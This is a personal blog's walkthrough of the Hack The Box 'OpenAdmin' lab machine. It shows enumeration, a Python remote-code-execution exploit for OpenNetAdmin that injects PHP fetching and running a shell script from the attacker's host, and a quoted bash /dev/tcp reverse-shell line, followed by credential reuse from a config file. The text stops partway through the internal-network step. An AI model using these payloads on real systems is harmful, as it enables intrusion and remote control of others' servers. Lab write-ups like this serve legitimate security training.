<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Ahmed | Hack The Box - OpenAdmin</title>
  <meta name="description" content="This is my writeup and walkthrough for OpenAdmin from Hack The Box.">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="Hack The Box - OpenAdmin">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://y4mm1.github.io/posts/openadmin">
  <meta property="og:description" content="This is my writeup and walkthrough for OpenAdmin from Hack The Box.">
  <meta property="og:site_name" content="Ahmed">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="https://y4mm1.github.io/posts/openadmin">
  <meta name="twitter:title" content="Hack The Box - OpenAdmin">
  <meta name="twitter:description" content="This is my writeup and walkthrough for OpenAdmin from Hack The Box.">

  
    
      <meta property="og:image" content="https://y4mm1.github.io/assets/documentation/hack-the-box/openadmin/openadmin-0f608bea70f42b76725f9608366ae6060fbf044040c41bc9160d08790ce0e36f.jpg">
      <meta name="twitter:image" content="https://y4mm1.github.io/assets/documentation/hack-the-box/openadmin/openadmin-0f608bea70f42b76725f9608366ae6060fbf044040c41bc9160d08790ce0e36f.jpg">
    
  

  <link href="https://y4mm1.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Ahmed Last 10 blog posts" />

  

  

    
      <link rel="icon" type="image/x-icon" href="/assets/favicon-color-0e896bd8673d9f83cea8d7b0a12fcc894681d58fc475ad499adfed94067b1e1f.png">
      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-light-87d1f2a3a19b1500e5c1626a0492025ca5f7f97d24540dc5900288e92112925a.png">
      <link rel="stylesheet" type="text/css" href="/assets/light-d09aacb6545f381fc97f304886774210c2a8683515671143f960bc0912af94fe.css">
    

  

</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="Ahmed">Ahmed</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
  <use href="/assets/about-ab4928d09cef6e09136b8d40637999db4f9575f927c33156e7f3e37d450e5df1.svg#icon-about" xlink:href="/assets/about-ab4928d09cef6e09136b8d40637999db4f9575f927c33156e7f3e37d450e5df1.svg#icon-about"></use>
</svg>

        </a>
      </li>
    
    
    
      <li>
        <a href="https://www.facebook.com/manneredperson" rel="noreferrer noopener" target="_blank" title="Facebook">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-facebook">
  <use href="/assets/facebook-5a38f0a900ec68e86eaccd4683fcad4e4de77281f876d9476a560a0a69cac8bf.svg#icon-facebook" xlink:href="/assets/facebook-5a38f0a900ec68e86eaccd4683fcad4e4de77281f876d9476a560a0a69cac8bf.svg#icon-facebook"></use>
</svg>

        </a>
      </li>
    
    
    
      <li>
        <a href="https://github.com/y4mm1" rel="noreferrer noopener" target="_blank" title="GitHub">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
  <use href="/assets/github-706d546fe6b5a32deca92fb08bbe60e78ea4e8027e889107905eb61f1063bcec.svg#icon-github" xlink:href="/assets/github-706d546fe6b5a32deca92fb08bbe60e78ea4e8027e889107905eb61f1063bcec.svg#icon-github"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
      <li>
        <a href="https://www.linkedin.com/in/sayeddd" rel="noreferrer noopener" target="_blank" title="LinkedIn">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
  <use href="/assets/linkedin-3bd8eb5ea036958dc7b3ee3de6612dbfa9e0744f369f20f7895d6a2782bbaf43.svg#icon-linkedin" xlink:href="/assets/linkedin-3bd8eb5ea036958dc7b3ee3de6612dbfa9e0744f369f20f7895d6a2782bbaf43.svg#icon-linkedin"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
    
    
    
      <li>
        <a href="mailto:ahmedsayedgfx@gmail.com" title="Email">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
  <use href="/assets/email-30a104adb1e2728097a984fbea2995978b6fff6c12906a734044ebd388848b70.svg#icon-email" xlink:href="/assets/email-30a104adb1e2728097a984fbea2995978b6fff6c12906a734044ebd388848b70.svg#icon-email"></use>
</svg>

        </a>
      </li>
    
    
      <li>
        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
  <use href="/assets/rss-cdc7a721b47671668abb0ba57f9f8db8022096e0051ff51b9e08e6cc049453a4.svg#icon-rss" xlink:href="/assets/rss-cdc7a721b47671668abb0ba57f9f8db8022096e0051ff51b9e08e6cc049453a4.svg#icon-rss"></use>
</svg>

        </a>
      </li>
    
    
  </ul>
</nav>


  <ul class="header-tags scrollappear">
    
    
      
        <li><a href="/tag/AUCTF">Auctf</a></li>
    
      
        <li><a href="/tag/CTF">Ctf</a></li>
    
      
        <li><a href="/tag/WPICTF">Wpictf</a></li>
    
      
        <li><a href="/tag/algorithms">Algorithms</a></li>
    
      
        <li><a href="/tag/analysis">Analysis</a></li>
    
      
        <li><a href="/tag/angstromCTF">Angstromctf</a></li>
    
      
        <li><a href="/tag/c">C</a></li>
    
      
        <li><a href="/tag/cracking">Cracking</a></li>
    
      
        <li><a href="/tag/crypto">Crypto</a></li>
    
      
        <li><a href="/tag/cryptography">Cryptography</a></li>
    
      
        <li>...</li>
        <li><a href="/tags">Show all</a></li>
        
  </ul>


        <article class="article scrollappear">
          <header class="article-header">
            <h1>Hack The Box - OpenAdmin</h1>
            <p>This is my writeup and walkthrough for OpenAdmin from Hack The Box.</p>
            <div class="article-list-footer">
  <span class="article-list-date">
    May 2, 2020
  </span>
  <span class="article-list-divider">-</span>
  <span class="article-list-minutes">
    
    
      9 minute read
    
  </span>
  <span class="article-list-divider">-</span>
  <div class="article-list-tags">
    
      
      <a href="/tag/security" title="See all posts with tag 'Security'">Security</a>
    
      
      <a href="/tag/hack-the-box" title="See all posts with tag 'Hack-The-Box'">Hack-The-Box</a>
    
      
      <a href="/tag/machines" title="See all posts with tag 'Machines'">Machines</a>
    
      
      <a href="/tag/ssh" title="See all posts with tag 'SSH'">SSH</a>
    
      
      <a href="/tag/mysql" title="See all posts with tag 'MySQL'">MySQL</a>
    
      
      <a href="/tag/root" title="See all posts with tag 'Root'">Root</a>
    
      
      <a href="/tag/openadmin" title="See all posts with tag 'OpenAdmin'">OpenAdmin</a>
    
      
      <a href="/tag/pentesting" title="See all posts with tag 'Pentesting'">Pentesting</a>
    
      
      <a href="/tag/webapp" title="See all posts with tag 'Webapp'">Webapp</a>
    
      
      <a href="/tag/hacking" title="See all posts with tag 'Hacking'">Hacking</a>
    
      
      <a href="/tag/nmap" title="See all posts with tag 'Nmap'">Nmap</a>
    
  </div>
</div>
          </header>

          <div class="article-content">
            <p><a href="/assets/documentation/hack-the-box/openadmin/openadmin-0f608bea70f42b76725f9608366ae6060fbf044040c41bc9160d08790ce0e36f.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/openadmin-0f608bea70f42b76725f9608366ae6060fbf044040c41bc9160d08790ce0e36f.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/openadmin-0f608bea70f42b76725f9608366ae6060fbf044040c41bc9160d08790ce0e36f.jpg" data-zooming-width="591" data-zooming-height="372">
</a></p>

<p>It was an easy machine from <strong>Hack The Box</strong> with:</p>
<ul>
  <li>0-day in some sort of webapp with RCE in an old version.</li>
  <li>SSH credentials in <code class="highlighter-rouge">mysql</code> config file.</li>
  <li>SSH private key on some internal network running in the background.</li>
  <li>GTFOBins on a file owned by root.</li>
</ul>

<h2 id="1-enumeration">1. Enumeration</h2>

<p>First things first, let’s add <code class="highlighter-rouge">10.10.10.171</code> in <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">openadmin.htb</code> and enumerate our machine with <code class="highlighter-rouge">nmap</code> to discover open ports and services.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-sT</span> <span class="nt">-o</span> openadmin openadmin.htb
<span class="gp">#</span><span class="w"> </span>Nmap 7.70 scan initiated Mon Jan  6 19:35:31 2020 as: nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> <span class="nt">-o</span> openadmin 10.10.10.171
<span class="go">Nmap scan report for 10.10.10.171
Host is up (0.19s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE   VERSION
</span><span class="gp">22/tcp   open     ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp   open     http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1092/tcp filtered obrpd
1185/tcp filtered catchpole
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Mon Jan  6 19:36:37 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>66.58 seconds</code></pre></figure>

<p>I found <code class="highlighter-rouge">http</code> on port <code class="highlighter-rouge">80</code> and <code class="highlighter-rouge">ssh</code> on port <code class="highlighter-rouge">22</code> and 2 other filtered ports.</p>

<p>The home page was <code class="highlighter-rouge">apache</code> default page and nothing else:</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/default-92baf24994d79bdfca1778bcb049a2991485dab4b76942be057c838c873ed63a.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/default-92baf24994d79bdfca1778bcb049a2991485dab4b76942be057c838c873ed63a.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/default-92baf24994d79bdfca1778bcb049a2991485dab4b76942be057c838c873ed63a.jpg" data-zooming-width="1870" data-zooming-height="1051">
</a></p>

<p>I tried different URLs but still nothing, so let’s jump into <code class="highlighter-rouge">gobuster</code> to enumerate other pages and directories:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://openadmin.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
<span class="go">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://openadmin.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/02 20:10:17 Starting gobuster
===============================================================
/music (Status: 301)
Progress: 980 / 87665 (1.12%)</span></code></pre></figure>

<p>I found <code class="highlighter-rouge">/music</code> page let’s see its content:</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/music-ad913e57754cc9180d1c3a39234684a9f299d816b81b66207b48434e7fb57ef5.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/music-ad913e57754cc9180d1c3a39234684a9f299d816b81b66207b48434e7fb57ef5.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/music-ad913e57754cc9180d1c3a39234684a9f299d816b81b66207b48434e7fb57ef5.jpg" data-zooming-width="1869" data-zooming-height="1006">
</a></p>

<p>It’s a beautiful UI with some interesting links: <code class="highlighter-rouge">login</code> redirect to <code class="highlighter-rouge">openadmin.htb/ona</code> and <code class="highlighter-rouge">create an account</code> to nothing. Let’s click on <code class="highlighter-rouge">login</code> to see what it goes:</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/ona-960ea82d4f1d3f260c11c2d9405ea7c19777500ad0b94ff35067c5b6eb49cbd4.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/ona-960ea82d4f1d3f260c11c2d9405ea7c19777500ad0b94ff35067c5b6eb49cbd4.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/ona-960ea82d4f1d3f260c11c2d9405ea7c19777500ad0b94ff35067c5b6eb49cbd4.jpg" data-zooming-width="1870" data-zooming-height="1031">
</a></p>

<p>It’s some sort of an web application, I struggled at this point for awhile trying to figure out what is this, then I found a login page.</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/ona_login-e728ef5683756a1b04cb8a199c0afcacac5e670b5fe7db15b00b1c92c0ef4224.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/ona_login-e728ef5683756a1b04cb8a199c0afcacac5e670b5fe7db15b00b1c92c0ef4224.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/ona_login-e728ef5683756a1b04cb8a199c0afcacac5e670b5fe7db15b00b1c92c0ef4224.jpg" data-zooming-width="1870" data-zooming-height="605">
</a></p>

<p>I tried <code class="highlighter-rouge">admin:admin</code> and it worked, but something wrong it redirect to the previous page with guest account not as admin. I intercepted the login request and send it using <code class="highlighter-rouge">burp</code> to see more details, but also nothing. I stuck a little, so I decided to search what is this application!.</p>

<blockquote>
  <p>“OpenNetAdmin is a system for tracking IP network attributes in a database. A web interface is provided to administer the data, and there is a fully functional CLI interface for batch management.”</p>
</blockquote>

<h2 id="2-exploitation">2. Exploitation</h2>

<p>I found RCE exploit with <code class="highlighter-rouge">searchsploit</code>, but the version <code class="highlighter-rouge">13.03</code> is older than running on the box <code class="highlighter-rouge">18.1.1</code>:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>searchsploit opennetadmin
<span class="go">----------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                         |  Path
                                                                       | (/usr/share/exploitdb/)
----------------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                          | exploits/php/webapps/26682.txt
----------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result</span></code></pre></figure>

<p>I always like trying old things to see if it still work or not. The file <code class="highlighter-rouge">26682.txt</code> contains some info about the exploit with <code class="highlighter-rouge">HTML</code> code as a PoC by <strong>Mandat0ry</strong> (aka Matthew Bryant). I didn’t like <code class="highlighter-rouge">HTML</code> to exploit the application, so I wrote some <code class="highlighter-rouge">python</code> script to automate our process:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
<span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">get</span><span class="p">,</span> <span class="n">post</span>

<span class="k">def</span> <span class="nf">RS</span><span class="p">():</span>
    <span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">choice</span>
    <span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_lowercase</span>
    <span class="k">return</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">choice</span><span class="p">(</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s">'http://openadmin.htb/ona/dcm.php'</span>
    <span class="n">php_shell</span> <span class="o">=</span> <span class="s">"&lt;?php exec('wget 10.10.15.253:8000/shell.sh;bash shell.sh') ?&gt;"</span>
    <span class="n">mod_name</span> <span class="o">=</span> <span class="n">RS</span><span class="p">()</span>
    <span class="n">params</span><span class="p">,</span> <span class="n">options</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(),</span> <span class="nb">dict</span><span class="p">()</span>

    <span class="n">options</span><span class="p">[</span><span class="s">'desc'</span><span class="p">]</span> <span class="o">=</span> <span class="n">php_shell</span> <span class="c1"># php code
</span>    <span class="n">options</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="n">mod_name</span>  <span class="c1"># module name to inject the code
</span>    <span class="n">options</span><span class="p">[</span><span class="s">'file'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'../../../../../../../../../../../var/log/ona.log'</span> <span class="c1"># the file itself that
</span>
    <span class="n">params</span><span class="p">[</span><span class="s">'options[desc]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">options</span><span class="p">[</span><span class="s">'desc'</span><span class="p">]</span>
    <span class="n">params</span><span class="p">[</span><span class="s">'module'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'add_module'</span>
    <span class="n">params</span><span class="p">[</span><span class="s">'options[name]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">options</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span>
    <span class="n">params</span><span class="p">[</span><span class="s">'options[file]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">options</span><span class="p">[</span><span class="s">'file'</span><span class="p">]</span>

    <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">'[!] Sending our payload...'</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">)</span>
    <span class="n">post_shell</span> <span class="o">=</span> <span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="n">params</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">'[+] Done'</span><span class="p">,</span> <span class="s">'green'</span><span class="p">)</span>

    <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">'[!] Spawning a shell...'</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">)</span>
    <span class="n">get_rce</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">'?module='</span> <span class="o">+</span> <span class="n">mod_name</span>
    <span class="n">get_shell</span> <span class="o">=</span> <span class="n">get</span><span class="p">(</span><span class="n">get_rce</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">get_shell</span><span class="o">.</span><span class="n">text</span>

<span class="n">exploit</span><span class="p">()</span></code></pre></figure>

<p>Simply, The exploit works because we can add modules without any type of authentication. Modules are in this form:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">module</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">The</span> <span class="n">name</span> <span class="n">of</span> <span class="n">the</span> <span class="n">function</span> <span class="n">that</span> <span class="n">will</span> <span class="n">be</span> <span class="n">run</span> <span class="n">out</span> <span class="n">of</span> <span class="n">the</span> <span class="n">included</span> <span class="nb">file</span>
<span class="n">module</span><span class="p">[</span><span class="n">description</span><span class="p">]</span> <span class="o">=</span> <span class="n">Irrelevant</span> <span class="n">description</span> <span class="n">of</span> <span class="n">the</span> <span class="n">module</span> <span class="p">(</span><span class="n">unless</span> <span class="n">some</span> <span class="n">PHP</span> <span class="n">code</span> <span class="ow">is</span> <span class="n">injected</span> <span class="n">here</span> <span class="n">hmm</span><span class="err">?</span><span class="p">)</span>
<span class="n">module</span><span class="p">[</span><span class="nb">file</span><span class="p">]</span> <span class="o">=</span> <span class="n">The</span> <span class="nb">file</span> <span class="n">to</span> <span class="n">be</span> <span class="n">included</span> <span class="ow">and</span> <span class="n">then</span> <span class="n">the</span> <span class="n">function</span></code></pre></figure>

<p>I can inject some <code class="highlighter-rouge">PHP</code> code into <code class="highlighter-rouge">/var/log/ona.log</code> file via the module description parameter. Every time a module is added to <strong>OpenNetAdmin</strong> app the <code class="highlighter-rouge">description, name</code> are all logged into this log file.
By setting the module file path to <code class="highlighter-rouge">../../../../../../../../../../../var/log/ona.log</code>, so we can include the log file as a module.</p>

<p>I tried to inject <code class="highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.15.253/1337 0&gt;&amp;1</code> as a reverse shell, but it didn’t work because of the way the logger script works I cannot use any <code class="highlighter-rouge">&lt;</code> or <code class="highlighter-rouge">&gt;</code>. So, I tried to escape it using <code class="highlighter-rouge">\&gt;</code>, but also didn’t work.</p>

<p>Let’s write the above script into a <code class="highlighter-rouge">shell.sh</code> file and upload it into the box and wait for a shell:</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/exploit-37d1f59d9a4447b91af28369085e6a9a6cb0b98f0dc860fa3e3ec8d895e8a74b.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/exploit-37d1f59d9a4447b91af28369085e6a9a6cb0b98f0dc860fa3e3ec8d895e8a74b.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/exploit-37d1f59d9a4447b91af28369085e6a9a6cb0b98f0dc860fa3e3ec8d895e8a74b.jpg" data-zooming-width="1870" data-zooming-height="1051">
</a></p>

<p>I got a shell with an old 0-day exploit as <code class="highlighter-rouge">www-data</code>, now let’s dive into privesc.</p>

<h2 id="3-privilege-escalation">3. Privilege Escalation</h2>

<p>First thing I though is to search for any interesting files, then I stuck a little until I found <code class="highlighter-rouge">mysql</code> database settings file inside <code class="highlighter-rouge">local/config</code> folder:</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/settings-5b24353b254705e5799ab995bd8188b817a6693cafcb5f7a5db3f07da0d4be85.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/settings-5b24353b254705e5799ab995bd8188b817a6693cafcb5f7a5db3f07da0d4be85.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/settings-5b24353b254705e5799ab995bd8188b817a6693cafcb5f7a5db3f07da0d4be85.jpg" data-zooming-width="1872" data-zooming-height="395">
</a></p>

<p>The file contains database creds</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nv">$ona_contexts</span><span class="o">=</span><span class="k">array</span> <span class="p">(</span>
  <span class="s1">'DEFAULT'</span> <span class="o">=&gt;</span>
  <span class="k">array</span> <span class="p">(</span>
    <span class="s1">'databases'</span> <span class="o">=&gt;</span>
    <span class="k">array</span> <span class="p">(</span>
      <span class="mi">0</span> <span class="o">=&gt;</span>
      <span class="k">array</span> <span class="p">(</span>
        <span class="s1">'db_type'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span><span class="p">,</span>
        <span class="s1">'db_host'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span><span class="p">,</span>
        <span class="s1">'db_login'</span> <span class="o">=&gt;</span> <span class="s1">'ona_sys'</span><span class="p">,</span>
        <span class="s1">'db_passwd'</span> <span class="o">=&gt;</span> <span class="s1">'n1nj4W4rri0R!'</span><span class="p">,</span>
        <span class="s1">'db_database'</span> <span class="o">=&gt;</span> <span class="s1">'ona_default'</span><span class="p">,</span>
        <span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span>
      <span class="p">),</span>
    <span class="p">),</span>
    <span class="s1">'description'</span> <span class="o">=&gt;</span> <span class="s1">'Default data context'</span><span class="p">,</span>
    <span class="s1">'context_color'</span> <span class="o">=&gt;</span> <span class="s1">'#D3DBFF'</span><span class="p">,</span>
  <span class="p">),</span>
<span class="p">);</span>
<span class="cp">?&gt;</span></code></pre></figure>

<p>Let’s try login to <code class="highlighter-rouge">mysql</code> and see the available users:</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/mysql-cd6d797d8a93ebad56a53c4cc98a52a2a25c28265f5c91776bfb55c8283a9346.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/mysql-cd6d797d8a93ebad56a53c4cc98a52a2a25c28265f5c91776bfb55c8283a9346.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/mysql-cd6d797d8a93ebad56a53c4cc98a52a2a25c28265f5c91776bfb55c8283a9346.jpg" data-zooming-width="1173" data-zooming-height="547">
</a></p>

<p>I got two <code class="highlighter-rouge">md5</code> hashes after cracking <code class="highlighter-rouge">guest:test</code> and <code class="highlighter-rouge">admin:admin</code>. I tried <code class="highlighter-rouge">ssh</code> using those creds but nothing worked. After awhile I went back to what I’ve gained so far and thought let’s try database password to switch with an existing users. I tried first user <code class="highlighter-rouge">jimmy</code> and it worked.</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/jimmy-bb61ba9621a9bb791628f6575785a84483cb65a923a39c4f39034fcdea71e9fe.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/jimmy-bb61ba9621a9bb791628f6575785a84483cb65a923a39c4f39034fcdea71e9fe.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/jimmy-bb61ba9621a9bb791628f6575785a84483cb65a923a39c4f39034fcdea71e9fe.jpg" data-zooming-width="868" data-zooming-height="745">
</a></p>

<h2 id="4-internal-network">4. Internal Network</h2>

<p>This user isn’t the actual user so, as we saw above there is another user <code class="highlighter-rouge">joanna</code>. I started searching for files and finally I got a folder called <code class="highlighter-rouge">internal</code> inside <code class="highlighter-rouge">/var/www</code> :</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">    282830      4 -rwxrwxr-x   1 jimmy            internal                     339 Nov 23 17:40 /var/www/internal/main.php
      2644      4 -rwxrwxr-x   1 jimmy            internal                     185 Nov 23 16:37 /var/www/internal/logout.php
      1387      4 -rwxrwxr-x   1 jimmy            internal                    3229 Nov 22 23:24 /var/www/internal/index.php</span></code></pre></figure>

<p>Then, I got an interesting <code class="highlighter-rouge">php</code> code inside <code class="highlighter-rouge">index.php</code> file.</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nv">$msg</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'login'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'jimmy'</span> <span class="o">&amp;&amp;</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha512'</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">==</span> <span class="s1">'00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f...'</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'jimmy'</span><span class="p">;</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /main.php"</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">'Wrong username or password.'</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure>

<p>The script wants to login via <code class="highlighter-rouge">main.php</code> using <code class="highlighter-rouge">jimmy</code> as a username and <code class="highlighter-rouge">sha512(password)</code> must match the following hash:
<code class="highlighter-rouge">00e302ccdcf1c60b8ad5...</code>. After I decrypt the hash I got <code class="highlighter-rouge">Revealed</code> as a password.</p>

<p>Now let’s see what other services running on the box:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">jimmy@openadmin:~$</span><span class="w"> </span>netstat <span class="nt">-lnpt</span> | <span class="nb">grep </span>LISTEN
<span class="go">netstat -lnpt | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -</span></code></pre></figure>

<p>I found a <code class="highlighter-rouge">TCP</code> service running locally on port <code class="highlighter-rouge">52846</code>. Let’s post our data on <code class="highlighter-rouge">127.0.0.1:52846/main.php</code> usign <code class="highlighter-rouge">curl</code>:</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/priv_key-c5b6226a3d299f1ea61218cf14a0018e751c61f6dac3af8454d32f5c433a9218.jpg">
